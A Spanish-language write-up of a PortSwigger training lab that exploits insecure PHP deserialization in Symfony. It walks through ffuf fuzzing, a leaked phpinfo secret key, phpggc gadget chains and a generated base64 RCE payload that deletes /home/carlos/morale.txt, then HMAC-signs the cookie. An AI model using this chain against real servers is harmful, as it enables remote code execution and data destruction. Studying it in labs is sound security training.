---
title: "Exploiting PHP deserialization with a pre-built gadget chain"
description: "Laboratorio de Portswigger sobre Insecure Deserialization"
date: 2025-01-02 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Insecure Deserialization
tags:
  - Portswigger Labs
  - Insecure Deserialization
  - Exploiting PHP deserialization with a pre-built gadget chain
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` utiliza un mecanismo de `sesiones` basado en la `serialización`, el cual emplea una `cookie firmada`. Además, usa un `framework` común de `PHP`. Aunque no tenemos acceso al `código fuente`, todavía podemos `explotar` la `deserialización insegura` de este laboratorio utilizando `cadenas de gadgets` predefinidas. Para `resolver` el laboratorio, debemos identificar el `framework objetivo` y usar una `herramienta de terceros` para generar un `objeto serializado malicioso` que contenga una `carga útil de ejecución remota de código`. Luego, trabajamos en cómo generar una `cookie firmada válida` que incluya nuestro `objeto malicioso`. Finalmente, pasamos esta cookie al `sitio web` para eliminar el archivo `morale.txt` del `directorio personal` de `Carlos`. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Insecure-Deserialization-Lab-6/image_1.png)

Pulsamos sobre `My account` y nos `logueamos` utilizando las credenciales `wiener:peter`

![](/assets/img/Insecure-Deserialization-Lab-6/image_2.png)

`Refrescamos` la `web` con `F5` y `capturamos` la `petición` con `Burpsuite`

![](/assets/img/Insecure-Deserialization-Lab-6/image_3.png)

El `token` está en `base64` así que lo `decodeamos` y vemos que es un `objeto` en `PHP`

```
# echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJoaWZpZG0wOG1qbHQzNzd5ejl1eTM5aDV2aWQ5a2ZxMCI7fQ==' | base64 -d
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hifidm08mjlt377yz9uy39h5vid9kfq0";}     
```

`Fuzzeamos` en `busca` de `rutas`

```
# ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://0ae900fd04815e4f81472ab800230027.web-security-academy.net/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0ae900fd04815e4f81472ab800230027.web-security-academy.net/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Login                   [Status: 200, Size: 3204, Words: 1310, Lines: 64, Duration: 59ms]
analytics               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 56ms]
cgi-bin                 [Status: 200, Size: 410, Words: 126, Lines: 17, Duration: 60ms]
cgi-bin/                [Status: 200, Size: 410, Words: 126, Lines: 17, Duration: 62ms]
favicon.ico             [Status: 200, Size: 15406, Words: 11, Lines: 1, Duration: 5005ms]
filter                  [Status: 200, Size: 10878, Words: 5093, Lines: 200, Duration: 63ms]
login                   [Status: 200, Size: 3204, Words: 1310, Lines: 64, Duration: 59ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 55ms]
my-account              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 55ms]
:: Progress: [4734/4734] :: Job [1/1] :: 11 req/sec :: Duration: [0:01:30] :: Errors: 2 ::
```

`Fuzzeamos` por `archivos` dentro de este directorio y `encontramos` un `phpinfo.php`

```
# ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://0ae900fd04815e4f81472ab800230027.web-security-academy.net/cgi-bin/FUZZ       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0ae900fd04815e4f81472ab800230027.web-security-academy.net/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

phpinfo.php             [Status: 200, Size: 69787, Words: 3256, Lines: 792, Duration: 378ms]
```

Accedemos a `https://0ae900fd04815e4f81472ab800230027.web-security-academy.net/cgi-bin/phpinfo.php` y obtenemos la `versión` de `PHP`

![](/assets/img/Insecure-Deserialization-Lab-6/image_4.png)

Vemos las `funciones` que están `deshabilitadas`

![](/assets/img/Insecure-Deserialization-Lab-6/image_5.png)

`Obtenemos` un `secret key `

![](/assets/img/Insecure-Deserialization-Lab-6/image_6.png)

Como se está transmitiendo un `objeto` en la `cookie` vamos a `borrar parte de la cookie` para `provocar` un `error` y `obtener información`. En este caso nos `arroja` la `versión` del `framework` en uso, que es `Symfony 4.3.6`

![](/assets/img/Insecure-Deserialization-Lab-6/image_7.png)

Nos descargamos la herramienta `phpggc` [https://github.com/ambionics/phpggc.git](https://github.com/ambionics/phpggc.git) y listamos los `Gadget Chains` disponibles para `symfony`

```
# php phpggc -l symfony

Gadget Chains
-------------

NAME             VERSION                                                 TYPE                  VECTOR          I    
Symfony/FD1      v3.2.7 <= v3.4.25 v4.0.0 <= v4.1.11 v4.2.0 <= v4.2.6    File delete           __destruct           
Symfony/FW1      2.5.2                                                   File write            DebugImport     *    
Symfony/FW2      3.4                                                     File write            __destruct           
Symfony/RCE1     v3.1.0 <= v3.4.34                                       RCE: Command          __destruct      *    
Symfony/RCE2     2.3.42 < 2.6                                            RCE: PHP Code         __destruct      *    
Symfony/RCE3     2.6 <= 2.8.32                                           RCE: PHP Code         __destruct      *    
Symfony/RCE4     3.4.0-34, 4.2.0-11, 4.3.0-7                             RCE: Function Call    __destruct      *    
Symfony/RCE5     5.2.*                                                   RCE: Function Call    __destruct           
Symfony/RCE6     v3.4.0-BETA4 <= v3.4.49 & v4.0.0-BETA4 <= v4.1.13       RCE: Command          __destruct      *    
Symfony/RCE7     v3.2.0 <= v3.4.34 v4.0.0 <= v4.2.11 v4.3.0 <= v4.3.7    RCE: Function Call    __destruct           
Symfony/RCE8     v3.4.0 <= v4.4.18 v5.0.0 <= v5.2.1                      RCE: Function Call    __destruct           
Symfony/RCE9     2.6.0 <= 4.4.18                                         RCE: Function Call    __destruct           
Symfony/RCE10    2.0.4 <= 5.4.24 (all)                                   RCE: Function Call    __toString           
Symfony/RCE11    2.0.4 <= 5.4.24 (all)                                   RCE: Function Call    __destruct           
Symfony/RCE12    1.3.0 <= 1.5.13~17                                      RCE: Function Call    __destruct      *    
Symfony/RCE13    1.2.0 <= 1.2.12                                         RCE: Function Call    Serializable    *    
Symfony/RCE14    1.2.0 <= 1.2.12                                         RCE: Function Call    __wakeup        *    
Symfony/RCE15    1.0.0 <= 1.1.9                                          RCE: Function Call    __wakeup        *    
Symfony/RCE16    1.1.0 <= 1.5.18                                         RCE: Function Call    Serializable    *    
```

`Generamos` un `objeto`

```
# ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0

Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```

Nos dirigimos a [https://www.freeformatter.com/hmac-generator.html](https://www.freeformatter.com/hmac-generator.html) y `generamos` una `firma`. Para ello `pegamos` el `objeto generado`, la `secret key` y el `algoritmo`

![](/assets/img/Insecure-Deserialization-Lab-6/image_8.png)

Desde el inspector `sustituimos` el campo `token` por el `objeto generado` y el campo `sig_hmac_sha1` por la nueva `firma`

![](/assets/img/Insecure-Deserialization-Lab-6/image_9.png)
